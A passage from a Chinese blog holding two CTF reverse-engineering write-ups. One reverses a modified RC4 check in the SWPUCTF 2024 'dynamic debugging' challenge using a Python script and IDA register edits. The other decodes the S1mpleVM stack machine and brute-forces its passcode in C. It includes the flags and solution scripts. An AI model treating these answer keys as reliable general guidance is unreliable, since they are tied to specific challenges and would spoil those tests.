      <a data-url="http://example.com/2025/08/10/justCTF2025/" data-id="cuidT5qwmRvaiqEwgrJT4VupB" data-title="justCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SWPUCTF2024" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/26/SWPUCTF2024/" class="article-date">
  <time class="dt-published" datetime="2024-11-26T08:07:31.000Z" itemprop="datePublished">2024-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/26/SWPUCTF2024/">SWPUCTF2024</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>题目名称：[SWPUCTF 2024 秋季新生赛] 动态调试 </li>
<li>题目链接：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5985">https://www.nssctf.cn/problem/5985</a></li>
<li>考点清单：动态调试，RC4</li>
<li>工具清单：IDA Pro，Die，dbg</li>
</ul>
<h3 id="4-1-看到什么"><a href="#4-1-看到什么" class="headerlink" title="4.1 看到什么"></a>4.1 看到什么</h3><p><em><strong>题目关键信息列表：</strong></em></p>
<p>下载附件后发现是rc4.exe文件</p>
<h3 id="4-2-解题思路"><a href="#4-2-解题思路" class="headerlink" title="4.2 解题思路"></a>4.2 解题思路</h3><p>根据文件名，能想到涉及到RC4加密算法，所以先了解RC4加密算法才能做出来.</p>
<p>常见的rc4流程：</p>
<ol>
<li>初始化密钥流</li>
<li>使用伪随机算法处理密钥流</li>
<li>将明文与密钥流逐字节异或，输出密文</li>
</ol>
<p>接下来就是查壳，有壳脱，无壳直接丢进IDA进行静态调试分析，分析不出就用动态调试，再写脚本得出flag。<del>（简单粗暴）</del></p>
<p>这个题其实只用静态调试就能做出来，我第一遍就是这样，但是多少有些不尊重题目名字，于是用动态又做了一遍，发现动态简单许多，别有一番风味。</p>
<h3 id="4-3-✅-尝试过程和结果记录"><a href="#4-3-✅-尝试过程和结果记录" class="headerlink" title="4.3 ✅ 尝试过程和结果记录"></a>4.3 ✅ 尝试过程和结果记录</h3><ol>
<li><p>查壳，发现64位无壳</p>
<style>.tvayxpqmmhpc{zoom:67%;}</style>
</li>
<li><p>丢进IDA，按下F5之后，观察和分析函数</p>
<style>.ibxpmetzhsqr{zoom:67%;}</style>

<p>首先将用户输入存在V2中，v3是密钥key的长度， <code>rc4_init(s, key, v3)</code>就是初始化密钥的函数</p>
<p><code>puts(&quot;....&quot;)/puts(&quot;..........&quot;)/.../puts(&quot;........................&quot;)</code>夹杂 <code>Sleep(500)</code> ，这部分是模拟正在处理（没有什么用，<del>没开会员的某度网盘估计就有一堆sleep</del>）</p>
<p> <code>rc4_crypt(s, v2, len)</code>便是加密函数，最后将处理后的V2和V1进行比较，全都相同就是正确的flag，那么思路就是V1反方向进行RC4解密即可，于是有两种做法。</p>
<h4 id="静态："><a href="#静态：" class="headerlink" title="静态："></a>静态：</h4><ol>
<li><p>首先得知道，如果要只凭静态调试得出flag，我们需要知道V1和key，还有详细的 <code>rc4_init(s, key, v3)</code>和 <code>rc4_crypt(s, v2, len)</code>流程，才能写出逆向脚本求得flag，所以我们一个个去寻找和分析。</p>
</li>
<li><p>待解密的V1和密钥key如下：</p>
<style>.vzorgqceuvsi{zoom:67%;}</style>

<style>.scybeyfgynwr{zoom:67%;}</style>

<p>我一般喜欢看16进制的界面（方便复制写脚本），如下：</p>
<style>.uphphbfmvccx{zoom:67%;}</style>

<style>.xfyuscgifvjb{zoom:67%;}</style>

<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">V1=[</span><br><span class="line">    0xCF, 0xA0, 0xC7, 0x24, 0x93, 0xEC, 0x51, 0xFB, 0x5E, 0xA5, 0xEE, 0xC5,</span><br><span class="line">    0xE7, 0xEA, 0xBB, 0x4A, 0xE0, 0x6E, 0x16, 0x63, 0xF0, 0x1A, 0x91, 0x04,</span><br><span class="line">    0xC1, 0x7E, 0x3F, 0x2B, 0x4F, 0x53, 0xB0, 0x62, 0xA3, 0xA1, 0xCF, 0xC1,</span><br><span class="line">    0x73, 0x85, 0x5F, 0xEC, 0x14, 0xD8, 0xD4, 0xE2, 0x00</span><br><span class="line">]</span><br><span class="line">key = b&quot;ysyy_114514&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来便是 <code>rc4_init</code>和 <code>rc4_crypt</code>函数</p>
<p><code>rc4_init</code>如下：</p>
<style>.bhhksoejwuil{zoom:67%;}</style>

<p>显然，这是RC4 加密算法中标准的<strong>密钥调度算法KSA</strong>，总结就是<code>s</code> 是一个被打乱的 0~255 的排列，它的顺序取决于提供的 <code>key</code>。这个数组 <code>s</code> 就是后续 RC4 加密&#x2F;解密过程中使用的密钥流的前身，也就是基础。</p>
<p><code>rc4_crypt</code>如下：</p>
<style>.nsikyzhdxnvt{zoom:67%;}</style>

<p>这部分就是RC4的加密函数，但是和标准的RC4有区别，新增了 <code>+ key[k % strlen(key)]</code> 这部分，说明出题人偷偷加了点自己的东西，但不多，影响不大。</p>
<p>流程是：</p>
<ol>
<li>每处理一个字节时，更新索引 <code>i</code> 和 <code>j</code>。</li>
<li>交换 <code>s[i]</code> 和 <code>s[j]</code>。</li>
<li>生成一个密钥字节：<code>s[(s[i] + s[j]) % 256]</code>。</li>
<li>用偏移后的密钥字节和明文异或：<code>Data[k] ^= key_byte+偏移值</code>，偏移值就是**<code>key[k % strlen(key)]</code>**，标准RC4是没有的。</li>
</ol>
</li>
<li><p>那么都齐全了，就可以写出逆向脚本了，我写的如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">key = b&quot;ysyy_114514&quot;</span><br><span class="line"></span><br><span class="line">v1 = bytes([</span><br><span class="line">    0xCF, 0xA0, 0xC7, 0x24, 0x93, 0xEC, 0x51, 0xFB, 0x5E, 0xA5, 0xEE, 0xC5,</span><br><span class="line">    0xE7, 0xEA, 0xBB, 0x4A, 0xE0, 0x6E, 0x16, 0x63, 0xF0, 0x1A, 0x91, 0x04,</span><br><span class="line">    0xC1, 0x7E, 0x3F, 0x2B, 0x4F, 0x53, 0xB0, 0x62, 0xA3, 0xA1, 0xCF, 0xC1,</span><br><span class="line">    0x73, 0x85, 0x5F, 0xEC, 0x14, 0xD8, 0xD4, 0xE2, 0x00</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">def rc4_init(key: bytes):</span><br><span class="line">    # 初始化状态 S 和辅助数组 K</span><br><span class="line">    S = list(range(256))</span><br><span class="line">    K = [key[i % len(key)] for i in range(256)]</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + S[i] + K[i]) &amp; 0xFF</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line">def rc4_crote(S: list, data: bytearray, key: bytes):</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    for idx in range(len(data)):</span><br><span class="line">        i = (i + 1) &amp; 0xFF</span><br><span class="line">        j = (j + S[i]) &amp; 0xFF</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        ks = S[(S[i] + S[j] + 1) &amp; 0xFF]</span><br><span class="line">        data[idx] = ((key[idx % len(key)] + ks) &amp; 0xFF) ^ data[idx]</span><br><span class="line"></span><br><span class="line">S = rc4_init(key)</span><br><span class="line"># 用 bytearray 可原地修改</span><br><span class="line">buf = bytearray(v1)</span><br><span class="line">rc4_crote(S, buf, key)</span><br><span class="line"># 以 0x00 为结束符，打印前面的所有字符</span><br><span class="line">flag = buf.split(b&#x27;\x00&#x27;, 1)[0].decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">print(&quot;flag =&quot;, flag)</span><br></pre></td></tr></table></figure>

<p>运行即可得到flag：<code>NSSCTF&#123;0d6f90ac-4b5e-4efb-8502-6349cf798f2e&#125;</code></p>
</li>
</ol>
<h4 id="动态："><a href="#动态：" class="headerlink" title="动态："></a>动态：</h4><ol>
<li>动态调试的工具，常见的就有：dbg，OD（Ollydbg），GDB（ELF文件）等等。这里当然IDA也是具备一定的动态调试能力，所以这道也可以试试IDA的动态调试</li>
<li>首先我们都知道RC4是对称加密算法，那么我们可以将原来代码中把 <code>v2</code> 内容直接改成 <code>v1</code> 的内容（密文），把 <code>len</code> 改为 <code>v1</code> 的长度</li>
</ol>
<p>那么接下来调用的 <code>rc4_crypt</code> 实际是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文 = 密文 ⊕ keystream</span><br></pre></td></tr></table></figure>

<p>那么利用程序本身就可以得出flag，，不需要自己去编写脚本了！</p>
<ol start="3">
<li><p>那么开始吧（来自师傅llc43212）：</p>
</li>
<li><p>在<code>rc4_crypt</code> 按下F2设置断点，同时IDA进入调试模式</p>
<style>.enoinpndcngy{zoom:67%;}</style>
</li>
<li><p>然后随便输入字符串，断点在<code>rc4_crypt</code> </p>
<style>.xsuliwstilnq{zoom:67%;}</style>
</li>
<li><p>然后一步步到 4019E8 停下. 接下来修改寄存器的值,</p>
<p>首先是传入的 Len 变量, 我们把它修改成密文一样的长度44</p>
<style>.bneyacytsurr{zoom:67%;}</style>
</li>
<li><p>右键 <strong>R8</strong> 寄存器然后选择 <strong>Modify Value,</strong> 输入 <strong>2C</strong></p>
<p>接下来我们返回源码窗口，找到 v1 的地址<br>然后将%rdx 修改为 v1 的地址</p>
<style>.gewlllyrbjgy{zoom:67%;}</style>

<p>然后返回源码窗口一步步调试. 再次进入 v1</p>
<style>.egiunhebgymh{zoom:67%;}</style>

<p>它的值已经被修改成flag，转成字符即可。</p>
</li>
</ol>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/26/SWPUCTF2024/" data-id="cuideJrVPxhBRLxIjXzfMIf94" data-title="SWPUCTF2024" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-S1mpleVM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/17/S1mpleVM/" class="article-date">
  <time class="dt-published" datetime="2024-11-17T14:05:32.000Z" itemprop="datePublished">2024-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/17/S1mpleVM/">S1mpleVM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)sub_140001D30(v30, v8) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_1400011B0(&quot;Ultimate secret box is not only the name muahahaha&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口</p>
<p>查看这个函数有很明显的 vm_handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall vmrun(char *input, char *vmcode)</span><br><span class="line">&#123;</span><br><span class="line">  //some defs for local variable</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  v3 = *vmcode - 16;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + 1;</span><br><span class="line">  while ( 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0u:</span><br><span class="line">        if ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          free(v9);</span><br><span class="line">          if ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            free(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = 0x80000000;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = 0x80000000;</span><br><span class="line">          v8 = 0x80000000;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (signed int *)j__malloc_base(0x10uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        goto LABEL_53;</span><br><span class="line">      case 1u:</span><br><span class="line">        //...</span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + 1) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p>
<ul>
<li>0：取模操作（先弹出的值在运算符左侧）</li>
<li>1：push 操作</li>
<li>2：pop 操作</li>
<li>3：乘法操作</li>
<li>4：加法操作</li>
<li>5：输出</li>
<li>6：取输入指针</li>
<li>7：右移位后取最低位（先弹出的值在运算符右侧）</li>
<li>8：异或操作</li>
<li>9：输入指针+1</li>
<li>10：返回</li>
<li>11：减法操作（先弹出的值在运算符左侧）</li>
<li>12：除法操作（先弹出的值在运算符左侧）</li>
</ul>
<p>运行根据程序写的cpp文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o test</span><br><span class="line">./test</span><br><span class="line">./test &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>节选一段log：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure>

<p>最前面输出了一句话：Thank for providing passcode, my ultimate secret box is checking…</p>
<p>跳过之后，发现它在频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>。这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure>

<p>得到权值的方法：在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p>
<p>得到异或目标值：在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>看log的最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure>

<p>计算的第一个异或值，在最后被加起来返回了。</p>
<p>最终根据逻辑，写出还原 passcode 的逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char v[]=&#123;</span><br><span class="line">2,3,67,37,41,11,13,89,2,3,67,5,7,47,61,29,2,67,37,7,43,11,13,31,97,3,41,73,11,13,53,29,97,67,3,11,43,13,47,83,67,5,37,71,7,11,89,29,2,3,5,11,13,83,53,61,2,3,7,71,43,83,29,31,7,73,11,13,53,89,29,31,2,3,5,37,7,43,13,61,2,5,7,43,11,13,53,89,5,7,73,43,11,13,59,31,3,5,73,41,43,13,83,89,2,7,71,11,43,13,29,61,2,5,7,11,13,79,47,83,3,67,37,5,73,11,13,61,2,67,5,7,71,11,13,61,67,3,5,37,43,11,13,61,2,3,37,7,71,41,11,29,3,5,41,11,43,47,53,29,2,3,7,71,43,13,47,79,2,3,5,37,11,43,13,79,97,67,5,37,7,41,11,61,3,71,7,43,11,79,53,61,2,3,71,73,11,13,61,31,97,2,3,67,5,11,13,83,2,3,5,37,7,41,11,53,2,3,73,43,11,13,53,61,2,67,3,37,7,11,47,59,2,37,5,73,13,47,53,59,2,67,71,73,41,11,13,89,2,3,67,37,73,11,43,59,&#125;;</span><br><span class="line">char target[]=&#123;70,56,70,77,74,90,87,82,60,67,86,95,64,94,85,66,33,69,64,98,67,71,94,93,90,32,65,82,68,65,93,96,&#125;;</span><br><span class="line">int checkval(int i,int pos)&#123;</span><br><span class="line">	int sum=0;</span><br><span class="line">	for(int j=0;j&lt;8;j++)&#123;</span><br><span class="line">		sum+=((i&gt;&gt;j)&amp;1)*v[j+pos*8];</span><br><span class="line">	&#125;</span><br><span class="line">	return sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	for(size_t i=0;i&lt;sizeof(target);i++)&#123;</span><br><span class="line">		for(int j=0x20;j&lt;127;j++)&#123;</span><br><span class="line">			if(target[i]==checkval(j,i))&#123;</span><br><span class="line">				putchar(j);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span><br></pre></td></tr></table></figure>

<style>.wddjxumsrnbg{zoom:80%;}</style><img src="/2024/11/17/S1mpleVM/image-20251107213047428.png" class="wddjxumsrnbg" alt="image-20251107213047428">

<p>输入得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/17/S1mpleVM/" data-id="cuidrYGxsG84V-ZbXrAA45G9N" data-title="S1mpleVM" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/17/hello/" class="article-date">
  <time class="dt-published" datetime="2023-11-17T07:08:30.000Z" itemprop="datePublished">2023-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/17/hello/">hello</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
